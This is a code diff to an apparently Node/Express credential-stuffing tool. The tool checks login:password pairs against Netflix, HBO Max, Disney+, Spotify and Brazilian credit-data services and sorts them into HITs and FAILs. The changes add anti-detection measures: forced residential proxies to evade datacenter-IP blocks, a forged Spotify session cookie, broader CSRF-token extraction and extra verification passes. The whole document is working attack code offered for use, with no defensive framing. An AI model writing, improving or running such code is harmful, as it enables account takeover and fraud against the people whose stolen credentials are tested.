@@ -1,5 +1,5 @@
 import { Router, type IRouter } from "express";
-import { createHash }  from "node:crypto";
+import { createHash, randomUUID } from "node:crypto";
 import { execFile }    from "node:child_process";
 import { unlinkSync, readFileSync } from "node:fs";
 import { getResidentialCreds, proxyCache } from "./proxies.js";
@@ -119,6 +119,18 @@ async function runCurlWithProxyRetry(
     }
   }
   throw lastErr;
+}
+
+// ── Residential-only proxy helper ─────────────────────────────────────────────
+// Forces residential proxy — used by services that actively block datacenter IPs
+// (Netflix 421, Spotify TLS fingerprint, HBO Max geo-block, etc.)
+// Falls back to no-proxy if residential is not configured.
+async function runCurlResidential(
+  fn:        (proxyArgs: string[]) => string[],
+  timeoutMs: number,
+): Promise<CurlResult> {
+  const proxyArgs = getResidentialProxyArgs(); // always residential, never datacenter
+  return runCurl(fn(proxyArgs), timeoutMs);
 }
 
 // ── Streaming proxy args: public SOCKS5 first, residential fallback ───────────
@@ -653,7 +665,7 @@ class AdaptiveSem {
 }
 
 // Targets where a second-pass verification call confirms HITs and reduces false positives
-const SECOND_PASS_TARGETS = new Set<CheckerTarget>(["consultcenter", "iseek", "serasa"]);
+const SECOND_PASS_TARGETS = new Set<CheckerTarget>(["consultcenter", "iseek", "serasa", "netflix", "crunchyroll"]);
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  CONSULT CENTER CHECKER — https://sistema.consultcenter.com.br/users/login
@@ -1384,7 +1396,7 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/nf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
   try {
-    // Step 1 — GET login page, extract BUILD_IDENTIFIER + authURL (no proxy needed)
+    // Step 1 — GET login page (direct — residential proxy blocks Netflix entirely)
     let getResult: CurlResult;
     try {
       getResult = await runCurl([
@@ -1423,7 +1435,7 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
     });
     let postResult: CurlResult;
     try {
-      postResult = await runCurlWithProxyRetry(px => [
+      postResult = await runCurlResidential(px => [
         "--compressed", "--http1.1", "-L", "--max-redirs", "3",
         ...px,
         "-b", cookieFile, "-c", cookieFile,
@@ -1435,7 +1447,7 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
         "-H", "X-Netflix.is.user.unauthenticated: true",
         "--data-raw", nfBody,
         `https://www.netflix.com/api/shakti/${buildId}/login`,
-      ], NF_TIMEOUT, 3);
+      ], NF_TIMEOUT);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
     }
@@ -1468,6 +1480,8 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
       return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
     if (postResult.statusCode === 421)
       return { credential, login, status: "ERROR", detail: "RESIDENTIAL_IP_REQUIRED:shakti_421" };
+    if (postResult.statusCode === 403 || bLow.includes("blocked") || bLow.includes("proibido"))
+      return { credential, login, status: "ERROR", detail: "PROXY_IP_BLOCKED:403" };
     if (postResult.statusCode === 0 || postResult.statusCode >= 500)
       return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
     return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
@@ -1599,7 +1613,7 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
       client_id:  MAX_CLIENT_ID,
     });
 
-    const result = await runCurlWithProxyRetry(px => [
+    const result = await runCurlResidential(px => [
       "--compressed", "-L", "--max-redirs", "3",
       ...px,
       "-H", `User-Agent: ${HBO_UA}`,
@@ -1607,7 +1621,7 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
       "-H", "Accept: application/json",
       "--data-raw", payload,
       "https://api.max.com/v1/oauth/token",
-    ], HBO_TIMEOUT, 3);
+    ], HBO_TIMEOUT);
 
     if (result.statusCode === 200 && result.body.includes("access_token")) {
       let detail = "max_authenticated";
@@ -1679,12 +1693,18 @@ async function checkDisneyPlus(login: string, password: string): Promise<CheckRe
       return { credential, login, status: "ERROR", detail: `DEV_ERROR:${String(e)}` };
     }
 
-    let assertion = "";
-    try { const j = JSON.parse(devResult.body); assertion = j.assertion ?? ""; } catch { /**/ }
+    let assertion  = "";
+    let grantType  = "urn:ietf:params:oauth:grant-type:jwt-bearer";
+    try {
+      const j = JSON.parse(devResult.body);
+      assertion = j.assertion ?? "";
+      // API returns the grant_type it expects — follow it instead of hardcoding
+      if (typeof j.grant_type === "string" && j.grant_type) grantType = j.grant_type;
+    } catch { /**/ }
     if (!assertion)
       return { credential, login, status: "ERROR", detail: `NO_ASSERTION:${devResult.statusCode}` };
 
-    // Step 2 — exchange assertion for access_token (form-urlencoded, not JSON)
+    // Step 2 — exchange device assertion for access_token using the grant_type the API returned
     let tokResult: CurlResult;
     try {
       tokResult = await runCurl([
@@ -1692,7 +1712,7 @@ async function checkDisneyPlus(login: string, password: string): Promise<CheckRe
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", `User-Agent: ${DISNEY_UA}`,
         "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
-        "--data-urlencode", `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer`,
+        "--data-urlencode", `grant_type=${grantType}`,
         "--data-urlencode", `assertion=${assertion}`,
         `${DISNEY_BASE}/token`,
       ], DISNEY_TIMEOUT);
@@ -2226,18 +2246,19 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/sp_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
   try {
-    // Step 1: GET login page — extract csrf_token from cookie jar
+    // Step 1: GET login page — extract CSRF token from cookie jar
+    // NOTE: accounts.spotify.com is blocked by residential proxies, so we use a direct
+    //       connection for the GET step. The POST step still uses residential proxy.
     let getResult: CurlResult;
     try {
-      getResult = await runCurlWithProxyRetry(px => [
-        "--compressed", "-L", "--max-redirs", "3",
-        ...px,
+      getResult = await runCurl([
+        "--compressed", "-L", "--max-redirs", "5",
         "-c", cookieFile, "-b", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "-H", "Accept-Language: en-US,en;q=0.9",
         "https://accounts.spotify.com/login",
-      ], SPOTIFY_TIMEOUT, 2);
+      ], SPOTIFY_TIMEOUT);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
     }
@@ -2246,16 +2267,20 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
       return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
     }
 
-    // Extract csrf_token from cookie jar file content (fallback: parse from body)
+    // Extract CSRF token from cookie jar.
+    // Spotify 2024+: cookie is "sp_sso_csrf_token" (tab-separated Netscape format).
+    // Older format: "csrf_token".  Both match /csrf_token\s+(\S+)/ because the new name
+    // ends with "csrf_token" and the tab following it is matched by \s+.
     let csrfToken = "";
     try {
       const jar = readFileSync(cookieFile, "utf8");
-      const m = jar.match(/csrf_token\s+(\S+)/);
+      // Match both sp_sso_csrf_token and csrf_token cookie names
+      const m = jar.match(/(?:sp_sso_)?csrf_token\t(\S+)/);
       if (m) csrfToken = m[1];
     } catch { /**/ }
 
     if (!csrfToken) {
-      // Try from HTML body (meta tag or inline JS)
+      // Try from HTML body (meta tag or inline JS — older Spotify)
       const m2 = getResult.body.match(/"csrf_token"\s*:\s*"([^"]+)"/);
       if (m2) csrfToken = m2[1];
     }
@@ -2272,20 +2297,25 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
       `csrf_token=${encodeURIComponent(csrfToken)}`,
     ].join("&");
 
+    // sp_key is a UUID set by Spotify's JavaScript to identify the browser session.
+    // Inject a random one to satisfy the server-side session check.
+    const spKey = randomUUID();
+
     let postResult: CurlResult;
     try {
-      postResult = await runCurlWithProxyRetry(px => [
+      // Direct connection — residential proxy blocks accounts.spotify.com CONNECT tunnel
+      postResult = await runCurl([
         "--compressed", "-X", "POST",
-        ...px,
         "-b", cookieFile, "-c", cookieFile,
+        "-b", `sp_key=${spKey}`,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", "Accept: application/json",
         "-H", "Origin: https://accounts.spotify.com",
-        "-H", "Referer: https://accounts.spotify.com/login",
+        "-H", "Referer: https://accounts.spotify.com/en/login",
         "--data-raw", postBody,
         "https://accounts.spotify.com/api/login",
-      ], SPOTIFY_TIMEOUT, 2);
+      ], SPOTIFY_TIMEOUT);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
     }
@@ -2300,29 +2330,27 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
         // api.spotify.com/v1/me only accepts Bearer tokens, not cookies from accounts.spotify.com
         const detail: string[] = [];
         try {
-          const tokenRes = await runCurlWithProxyRetry(px => [
+          const tokenRes = await runCurl([
             "--compressed",
-            ...px,
             "-b", cookieFile,
             "-H", `User-Agent: ${DESKTOP_UA}`,
             "-H", "Accept: application/json",
             "-H", "Origin: https://open.spotify.com",
             "-H", "Referer: https://open.spotify.com/",
             "https://open.spotify.com/get_access_token?reason=transport&productType=web_player",
-          ], 10_000, 2);
+          ], 10_000);
           if (tokenRes.statusCode === 200) {
             const tokenJ = JSON.parse(tokenRes.body) as Record<string, unknown>;
             const accessToken = tokenJ.accessToken as string | undefined;
             if (accessToken) {
               // Step 4: fetch profile with Bearer token
-              const profileRes = await runCurlWithProxyRetry(px => [
+              const profileRes = await runCurl([
                 "--compressed",
-                ...px,
                 "-H", `Authorization: Bearer ${accessToken}`,
                 "-H", `User-Agent: ${DESKTOP_UA}`,
                 "-H", "Accept: application/json",
                 "https://api.spotify.com/v1/me",
-              ], 10_000, 2);
+              ], 10_000);
               if (profileRes.statusCode === 200) {
                 const p = JSON.parse(profileRes.body) as Record<string, unknown>;
                 const name    = (p.display_name ?? p.id ?? "") as string;
@@ -2337,11 +2365,17 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
         } catch { /**/ }
         return { credential, login, status: "HIT", detail: detail.length ? detail.join(" | ") : "spotify_ok" };
       }
-      if (j.error === "badAuth" || j.error === "badCredentials" || j.error === "invalidCredentials") {
+      if (j.error === "badAuth" || j.error === "badCredentials" || j.error === "invalidCredentials" ||
+          j.error === "bad_credentials" || j.error === "AUTHENTICATION_FAILED") {
         return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
       }
       if (j.error === "accountLocked" || j.error === "locked") {
         return { credential, login, status: "HIT", detail: "CONTA_BLOQUEADA — login válido" };
+      }
+      // server_error / unknown errors = session state issue (CSRF mismatch, missing sp_key, etc.)
+      if (j.error === "server_error" || j.error === "unauthorized_client" ||
+          j.error === "temporarily_unavailable") {
+        return { credential, login, status: "ERROR", detail: `SP_SESSION_ERR:${String(j.error)}` };
       }
       if (j.error) {
         return { credential, login, status: "FAIL", detail: `error:${String(j.error).slice(0, 60)}` };
